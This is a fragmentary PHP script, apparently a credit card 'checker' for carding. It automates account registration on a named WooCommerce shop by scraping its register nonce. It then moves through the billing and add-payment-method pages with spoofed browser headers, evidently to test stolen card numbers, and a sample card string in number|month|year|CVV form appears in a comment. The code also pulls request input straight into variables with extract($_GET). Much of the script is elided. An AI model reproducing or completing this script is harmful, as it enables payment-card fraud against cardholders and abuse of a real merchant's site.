...
extract($_GET);
//$lista = "4745034036004878|04|2024|000";
...
$cookie = generate_cookie();
 ...
 $page =  cURL(
    "https://www.onesmallchild.com/my-account/",
    $headers = [
 ...
 $register_nonce = GetStr($page, 'name="woocommerce-register-nonce" value="', '"');
  ...
  $add_payment = cURL(
    ...
    $headers = [
        ...
        "referer: https://www.onesmallchild.com/my-account/",
        "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0"
    ],
    ...
    "email=$fname%40gmail.com&woocommerce-register-nonce=$register_nonce&_wp_http_referer=%2Fmy-account%2F&register=Register",
    "POST",
    0,
    $cookie
);
...
$edit_address = cURL(
    'https://www.onesmallchild.com/my-account/edit-address/billing/',
    $headers = [
        "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0",
        "referer: https://www.onesmallchild.com/my-account/edit-address/",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
    ],
    "",
    "GET",
 ...
 $prepare_pm = cURL(
    'https://www.onesmallchild.com/my-account/add-payment-method/',
    $headers = [
        "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0",
        "referer: https://www.onesmallchild.com/my-account/edit-address/billing/",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
    ],
    "",
    "GET",
...
//   $ajax = cURL(
//     "https://www.onesmallchild.com/wp-admin/admin-ajax.php",
//     $headers = [
//         "accept: */*",
//         "content-type: application/x-www-form-urlencoded; charset=UTF-8",
//         "origin: https://www.onesmallchild.com",
//         "referer: https://www.onesmallchild.com/my-account/add-payment-method/",
